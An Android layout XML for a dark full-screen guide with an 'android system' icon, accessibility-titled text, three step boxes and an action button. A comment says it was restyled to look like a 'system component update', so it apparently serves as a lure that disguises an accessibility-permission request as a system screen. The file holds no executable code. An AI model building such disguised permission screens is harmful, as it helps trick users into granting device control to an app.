<?xml version="1.0" encoding="utf-8"?>
<!-- PATCHED (task-9): "system component update" style. All original view ids kept. -->
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#0D0F14">

    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:fillViewport="true"
        app:layout_constraintBottom_toTopOf="@id/buttonContainer"
        app:layout_constraintTop_toTopOf="parent">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:gravity="center_horizontal"
            android:orientation="vertical"
            android:padding="32dp">

            <ImageView
                android:layout_width="140dp"
                android:layout_height="140dp"
                android:layout_marginTop="40dp"
                android:src="@drawable/ic_android_system" />

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginTop="24dp"
                android:text="@string/guide_accessibility_title"
                android:textColor="#F2F4F8"
                android:textSize="24sp"
                android:textStyle="bold" />

            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="12dp"
                android:layout_marginBottom="40dp"
                android:alpha="0.9"
                android:gravity="center"
                android:text="@string/guide_accessibility_subtitle"
                android:textColor="#9AA3B2"
                android:textSize="16sp" />

            <!-- Step 1 -->
            <TextView
                android:id="@+id/tvGuideStep1"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="@drawable/guide_step_bg"
                android:padding="14dp"
                android:text="@string/guide_step_1"
                android:textColor="#B0B6C0"
                android:textSize="16sp"
                android:textStyle="bold" />

            <!-- Step 2 -->
            <TextView
                android:id="@+id/tvGuideStep2"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="@drawable/guide_step_bg"
                android:padding="14dp"
                android:text="@string/guide_step_2"
                android:textColor="#B0B6C0"
                android:textSize="16sp"
                android:textStyle="bold" />

            <!-- Step 3 -->
            <TextView
                android:id="@+id/tvGuideStep3"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="@drawable/guide_step_bg"
                android:padding="14dp"
                android:text="@string/guide_step_3"
                android:textColor="#B0B6C0"
                android:textSize="16sp"
                android:textStyle="bold" />

        </LinearLayout>
    </ScrollView>

    <FrameLayout
        android:id="@+id/buttonContainer"
        android:layout_width="match_parent"
        android:layout_height="100dp"
        android:background="#0D0F14"
        android:paddingBottom="16dp"
        app:layout_constraintBottom_toBottomOf="parent">

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnGuideAction"
            android:layout_width="191dp"
            android:layout_height="53dp"
            android:layout_gravity="center"
            android:fontFamily="sans-serif-medium"
            android:text="@string/guide_button"
            android:textAllCaps="true"
            android:textColor="#FFFFFF"
            android:textSize="18sp"
            android:textStyle="bold"
            app:backgroundTint="#0B875B"
            app:cornerRadius="100dp" />

    </FrameLayout>

</androidx.constraintlayout.widget.ConstraintLayout>
